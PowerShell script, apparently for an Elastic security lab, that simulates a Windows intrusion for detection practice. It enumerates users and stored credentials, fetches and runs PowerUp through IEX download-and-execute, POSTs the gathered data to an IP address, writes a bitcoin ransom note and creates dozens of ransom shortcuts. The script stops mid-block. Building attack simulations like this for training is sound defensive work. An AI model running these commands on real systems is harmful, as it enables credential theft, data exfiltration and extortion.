Write-Host "[+] Set up" -ForegroundColor Green
Import-Module "C:\AtomicRedTeam\invoke-atomicredteam\Invoke-AtomicRedTeam.psd1" -Force
Start-Sleep -S 15

Write-Host "[+] T1091" -ForegroundColor Green
Invoke-AtomicTest T1091
Start-Sleep -S 15

Write-Host "[+] Creating Secret Document" -ForegroundColor Green
New-Item -Path C:\temp -Type Directory
echo "VTBkV2VWcFRRbWhqYlZWbldWZDRjMGxIT1cxSlJ6RTFTVWhDYUdNelRqTmlNMHByWTNsQ2JXSXpTV2RrUjJod1kzbENkRmxYVG05aFZ6VnNUM2R3UWxwSE1YQmlhbkJYWWxaYU5WcFdXazlpUm10NlUyMTRhMUpyU205WmVrNVBUVEpKZWxOdGRHcGtNamc1UTJ0V2MxbFlUakJoVjAwMldsZDRhR016VW5CWmQzQktTVWRvZG1OSFZXZGtSMmhvWkVOQ01HRkhWalZKUjFKMlNVYzFkbVJEUW0xWlYzaHpTVWRzZFVsSVVuWkpTRkp2V2xOQ00yTnRPWFZhZVVKdldWYzFhMk41UldoSlVXODk=" > C:\Users\Elastic\Documents\SecretStuff.txt

Write-Host "[+] Windows Enumeration" -ForegroundColor Green
net user | Out-File -FilePath "C:\temp\Localenum.txt" -Append
ls c:\Users\ | Out-File -FilePath "C:\temp\Localenum.txt" -Append
cmdkey.exe /list | Out-File -FilePath "C:\temp\Localenum.txt" -Append
get-localuser | Out-File -FilePath "C:\temp\Localenum.txt" -Append
get-localgroup | Out-File -FilePath "C:\temp\Localenum.txt" -Append
net localgroup "Users" | Out-File -FilePath "C:\temp\Localenum.txt" -Append
net localgroup | Out-File -FilePath "C:\temp\Localenum.txt" -Append
get-localgroupmember -group Users | Out-File -FilePath "C:\temp\Localenum.txt" -Append
get-childitem C:\Users\ | Out-File -FilePath "C:\temp\Localenum.txt" -Append
powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1');Invoke-AllChecks | Out-File -FilePath C:\temp\Powerup.txt"
Start-Sleep -S 15

Write-Host "[+] Exfiltrating Data" -ForegroundColor Green
# Exfil will fail due to IP address
Get-Content C:\temp\Powerup.txt, C:\temp\Localenum.txt | Set-Content C:\temp\exfilFile.txt
$content = Get-Content C:\temp\exfilFile.txt
Invoke-WebRequest -Uri 172.31.33.46 -Method POST -Body $content

Start-Sleep -S 15

Write-Host "[+] Ransomware" -ForegroundColor Green

Echo "Ooops, your files have been encrypted! 

What Happened to My Computer? 
Your important files are encrypted. 
Many of your documents, photos, videos, databases and other files are no longer 
accessible because they have been encrypted. Maybe you are busy looking for a way to 
recover your files, but do not waste your time. Nobody can recover your files without 
our decryption service. 

Can I Recover My Files?
Sure. We guarantee that you can recover all your files safely and easily. But you have
not so enough time.
You can decrypt some of your files for free. Try now by clicking <Decrypt>.
But if you want to decrypt all your files, you need to pay.

You only have 3 days to submit the payment. After that the price will be doubled.
Also, if you don't pay in 7 days, you won't be able to recover your files forever.
We will have free events for users who are so poor that they couldn't pay in 6 months.

How Do I Pay?
Payment is accepted in Bitcoin only. For more information, click <About bitcoin>.
Please check the current price of Bitcoin and buy some bitcoins. For more information,
click <How to buy bitcoins>.And send the correct amount to the address specified in this window.
After your payment, click <Check Payment>. Best time to check: 9:00am - 11:00am

OUTEM Polda
B bitcoin
ACCEPTED HERE
Send $300 worth of bitcoin to this address:
12t9YDPgwueZ9NyMgw519p7AA8isjr6 SMw" > C:\Users\Elastic\Desktop\RANSOM_NOTE.txt

# Creation of files 
Write-Host "[+] Creating Files" -ForegroundColor Green
$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\Elastic\Desktop\Ransom.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\Elastic\Desktop\Ransom1.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\Elastic\Desktop\Ransom2.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\Elastic\Desktop\Ransom3.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\Elastic\Desktop\Ransom4.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\Elastic\Desktop\Ransom5.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\Elastic\Desktop\Ransom6.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\Elastic\Desktop\Ransom7.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\Elastic\Desktop\Ransom8.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\Elastic\Desktop\Ransom9.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\Elastic\Desktop\Ransom10.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\Elastic\Desktop\Ransom11.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\Elastic\Desktop\Ransom12.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\Elastic\Desktop\Ransom13.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\Elastic\Desktop\Ransom14.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\Elastic\Desktop\Ransom15.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\Elastic\Desktop\Ransom16.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\Elastic\Desktop\Ransom17.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\Elastic\Desktop\Ransom18.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\Elastic\Desktop\Ransom19.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\Elastic\Desktop\Ransom20.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\Elastic\Desktop\Ransom21.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\Elastic\Desktop\Ransom22.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\Elastic\Desktop\Ransom23.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\Elastic\Desktop\Ransom24.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\Elastic\Desktop\Ransom25.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\Elastic\Desktop\Ransom26.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\Elastic\Desktop\Ransom27.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\Elastic\Desktop\Ransom28.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\Elastic\Desktop\Ransom29.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\Elastic\Desktop\Ransom30.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\Elastic\Desktop\Ransom31.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\Elastic\Desktop\Ransom32.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\Elastic\Desktop\Ransom33.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\Elastic\Desktop\Ransom34.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\Elastic\Desktop\Ransom35.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\Elastic\Desktop\Ransom36.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\Elastic\Desktop\Ransom37.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\Elastic\Desktop\Ransom38.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\Elastic\Desktop\Ransom39.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\Elastic\Desktop\Ransom40.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\Elastic\Desktop\Ransom41.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\Elastic\Desktop\Ransom42.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\Elastic\Desktop\Ransom43.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\Elastic\Desktop\Ransom44.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\Elastic\Desktop\Ransom45.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\Elastic\Desktop\Ransom46.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\Elastic\Desktop\Ransom47.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\Elastic\Desktop\Ransom48.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\Elastic\Desktop\Ransom49.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\Elastic\Desktop\Ransom50.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\Elastic\Desktop\Ransom51.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\Elastic\Desktop\Ransom52.lnk"
